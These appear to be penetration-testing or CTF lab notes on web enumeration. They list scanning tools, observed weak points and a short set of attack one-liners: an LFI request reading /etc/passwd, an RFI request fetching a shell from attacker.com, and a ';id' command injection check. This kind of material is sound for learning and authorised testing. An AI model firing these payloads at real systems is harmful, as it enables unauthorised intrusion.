## 🌐 Web Enumeration (Machines 21–30)

```bash
# Common Web Enum Tools
gobuster dir -u http://<IP> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt
whatweb http://<IP>
nikto -h http://<IP>
wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hc 404 http://<IP>/FUZZ
```

### Patterns Observed (21–30)

- **Discovered web services** on ports 80, 8080, 443 across multiple machines.
- **Found sensitive endpoints** like `/upload`, `/backup`, `/monitor`, `/config`, and `/admin`.
- **CMS Identified**:
  - WordPress with vulnerable plugins/themes
  - Drupal 7/8 (LFI/SQLi exposed via GET params)
  - PHPMyAdmin exposed on non-standard ports
- **Common Auth Issues**:
  - Login panels vulnerable to default creds (`admin:admin`, `test:test`)
  - Password reset forms allowing account takeovers
- **Interesting headers & technologies**:
  - Apache, nginx, lighttpd with outdated versions
  - X-Powered-By revealing PHP versions
- **File Upload Bypasses** found:
  - Null byte `%00` and double extension `.jpg.php`
- **Useful disclosures**:
  - `robots.txt` exposing admin panels
  - `server-status` leaking internal IPs
  - Headers leaking environment info

### Notable Techniques

```bash
# LFI checks
curl http://<IP>/page.php?file=../../../../etc/passwd

# RFI (if allow_url_include=On)
curl http://<IP>/page.php?file=http://attacker.com/shell.txt

# Command Injection Checks
curl http://<IP>/ping.php?host=127.0.0.1;id

# Wordpress Enumeration
wpscan --url http://<IP> --enumerate u,t,p

# Headers Recon
curl -I http://<IP>
```

### Tags
#web #enumeration #lfi #rfi #upload #cms #bypass #headers #default-creds
